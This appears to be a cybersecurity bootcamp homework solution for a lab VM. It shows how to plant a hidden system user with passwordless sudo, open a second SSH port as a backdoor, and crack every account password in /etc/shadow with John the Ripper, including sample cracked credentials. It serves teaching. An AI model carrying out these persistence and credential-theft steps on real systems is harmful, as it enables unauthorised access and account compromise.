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# Week 6 Homework Solution: Advanced Bash - Owning the System</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### Lab Setup</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">1. Log into the VM as `root` on the attacker machine:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- Run `vagrant up` to stand up your lab environment.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- Within the attacker machine, log in with the credentials:</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">- Username: `sysadmin`</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">- Password: `cybersecurity`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">2. Using the attacker machine, remote into the target machine:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `ssh sysadmin@192.168.6.105 -p 22` and enter `passw0rd` when prompted.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">3. After logging in as `sysadmin` on the target machine, run `sudo -s` to escalate your user to `root`. Enter `passw0rd` when prompted.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You will not need the above steps as part of your submission file.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">---</text:p>
      <text:p text:style-name="P1">### Step 1: Shadow People</text:p>
      <text:p text:style-name="P1">1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo useradd sysd`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">2. Give your secret user a password:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo passwd sysd`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">3. Give your secret user a system UID &lt; 1000:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo usermod -u 400 sysd`</text:span></text:p>
      <text:p text:style-name="P2"><text:s/></text:p>
      <text:p text:style-name="P1">4. Give your secret user the same GID:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo groupmod -g 400 sysd`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">5. Give your secret user full `sudo` access without the need for a password:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo visudo`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- Add the line: `sysd ALL=(ALL:ALL) NOPASSWD:ALL` under the `root` entry:</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```bash</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1"># User privilege specification</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">root <text:s text:c="3"/>ALL=(ALL:ALL) ALL</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">sysd <text:s text:c="3"/>ALL=(ALL:ALL) NOPASSWD:ALL</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1"># Members of the admin group may gain root privileges</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">%admin ALL=(ALL) ALL</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- Swap to your `sysd` user and enter the password you set.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `su sysd`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">6. Test that `sudo` access works without your password:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo -l` will show the following output:</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```bash</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T1">Matching Defaults entries for sysd on scavenger-hunt:</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">env_reset, exempt_group=sudo, mail_badpass,</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">User sysd may run the following commands on scavenger-hunt:</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">(ALL : ALL) NOPASSWD: ALL</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### Step 2: Smooth Sailing</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">1. Edit the `sshd_config` file:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- Run `sudo nano /etc/ssh/sshd_config` and add the following line in the configuration file:</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```bash</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1"># Add an extra port line:</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">Port 22</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">Port 2222</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">``` </text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### Step 3: Testing Your Configuration Update</text:p>
      <text:p text:style-name="P1">1. Restart the SSH service:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `service ssh restart` or</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `systemctl restart ssh`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">2. Exit the `root` account:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `exit`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">3. SSH to the target machine using your `sysd` account and port `2222`:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `ssh sysd@192.168.6.105 -p 2222`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">4. Use `sudo` to switch to the root user:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo su`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### Step 4: Crack All the Passwords</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">1. SSH back to the system using your `sysd` account and port `2222`:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `ssh sysd@192.168.6.105 -p 2222`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `sudo su`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">- `john /etc/shadow`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s/><text:span text:style-name="T1">Wait approximately 5-10 minutes for John to crack all the passwords.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s/><text:span text:style-name="T1">- This partly depends on what password you set for your `sysd` user.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```bash</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1"># john /etc/shadow</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">Created directory: /root/.john</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">Loaded 7 password hashes with 7 different salts (crypt, generic crypt(3) [?/64])</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">Press 'q' or Ctrl-C to abort, almost any other key for status</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">computer <text:s text:c="8"/>(stallman)</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T1">freedom <text:s text:c="9"/>(babbage)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">trustno1 <text:s text:c="8"/>(mitnik)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">dragon <text:s text:c="10"/>(lovelace)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">lakers <text:s text:c="10"/>(turing)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">passw0rd <text:s text:c="8"/>(sysadmin)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">Goodluck! <text:s text:c="7"/>(student)</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">```</text:span></text:p>
      <text:p text:style-name="P1">--- </text:p>
      <text:p text:style-name="P5">© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved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4T08:38:24.506000000</meta:creation-date>
    <dc:date>2021-06-24T08:39:27.048000000</dc:date>
    <meta:editing-duration>PT1M2S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:generator>LibreOffice/7.1.3.2$Windows_X86_64 LibreOffice_project/47f78053abe362b9384784d31a6e56f8511eb1c1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="84" meta:word-count="511" meta:character-count="3356" meta:non-whitespace-character-count="2621"/>
  </office:meta>
</office:document-meta>
</file>